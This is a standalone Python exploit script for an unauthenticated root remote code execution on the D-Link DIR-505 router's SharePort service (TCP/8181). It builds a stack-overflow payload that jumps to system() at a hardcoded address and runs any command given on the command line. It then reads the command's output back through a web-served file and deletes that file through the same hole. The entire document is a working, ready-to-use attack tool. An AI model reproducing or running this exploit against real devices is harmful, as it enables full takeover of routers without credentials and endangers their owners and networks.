#!/usr/bin/env python3
# DIR-505 A1 1.10B02 — SharePort (TCP/8181) pre-auth root RCE
# webfile_cgi.cgi get_input_entries stack overflow -> .system PLT (0x40d180)
# No Cookie, no login, no HNAP credential.
import argparse, http.client, random, string, struct, sys, time

SYSTEM_PLT = 0x40D180
PAD_ENTRIES = 49
VALUE_LEN = 1051
SHAREPORT_PORT = 8181
OUTPUT_DIR = "/www/webfile_access"

def build_body(cmd: bytes) -> bytes:
    # field0 value is "0" + cmd; $a0 on main return = value+1 = cmd
    value = b"\x00" + b"A" * 1026 + struct.pack(">I", 0) * 5 + struct.pack(">I", SYSTEM_PLT)
    assert len(value) == VALUE_LEN
    return b"x=0" + cmd + b"&" * PAD_ENTRIES + b"a=" + value

def post(target, body, timeout=10.0):
    c = http.client.HTTPConnection(target, SHAREPORT_PORT, timeout=timeout)
    try:
        c.request("POST", "/dws/api/ListRoot", body=body,
                  headers={"Content-Type": "application/x-www-form-urlencoded",
                           "Content-Length": str(len(body))})
        r = c.getresponse()
        r.read(1024)
        return r.status
    except Exception as e:
        return f"ERR {type(e).__name__}: {e}"
    finally:
        c.close()

def get(target, path, timeout=5.0):
    c = http.client.HTTPConnection(target, SHAREPORT_PORT, timeout=timeout)
    try:
        c.request("GET", path)
        r = c.getresponse()
        return r.status, r.read(2 * 1024 * 1024)
    except Exception as e:
        return None, f"{type(e).__name__}: {e}".encode()
    finally:
        c.close()

def main():
    ap = argparse.ArgumentParser(description="DIR-505 SharePort pre-auth root RCE")
    ap.add_argument("--target", default="192.168.0.1", help="DIR-505 address")
    ap.add_argument("--id", action="store_true", help="read /proc/self/status")
    ap.add_argument("--cmd", default=None, help="command (no & or =)")
    args = ap.parse_args()
    if args.id and args.cmd:
        ap.error("use either --id or --cmd")
    cmd = "cat /proc/self/status" if args.id else args.cmd
    if not cmd:
        ap.error("specify --id or --cmd")
    if "&" in cmd or "=" in cmd:
        print("[!] command contains '&' or '=', which collides with the form parser", file=sys.stderr)
        return 1

    name = "sp_" + "".join(random.choice(string.ascii_lowercase + string.digits) for _ in range(10)) + ".txt"
    out_path = OUTPUT_DIR + "/" + name
    shell = cmd + " >" + out_path + " 2>>" + out_path + ";#"

    st = post(args.target, build_body(shell.encode()))
    print(f"[*] POST :{SHAREPORT_PORT}/dws/api/ListRoot -> {st}", file=sys.stderr)

    deadline = time.time() + 8.0
    out = None
    used_path = None
    candidates = ["/" + name, "/webfile_access/" + name, "/www/webfile_access/" + name]
    while time.time() < deadline:
        for path in candidates:
            code, data = get(args.target, path)
            if code == 200 and data:
                out = data
                used_path = path
                break
        if out is not None:
            break
        time.sleep(0.25)
    if out is None:
        print("[!] output not available on 8181; tried: " + ", ".join(candidates), file=sys.stderr)
        return 1
    print(f"[*] fetched {used_path} via TCP/{SHAREPORT_PORT}", file=sys.stderr)
    sys.stdout.buffer.write(out)
    if out and not out.endswith(b"\n"):
        sys.stdout.buffer.write(b"\n")

    # remove output through the same RCE
    post(args.target, build_body(f"rm -f {out_path};#".encode()), timeout=4.0)
    return 0

if __name__ == "__main__":
    sys.exit(main())
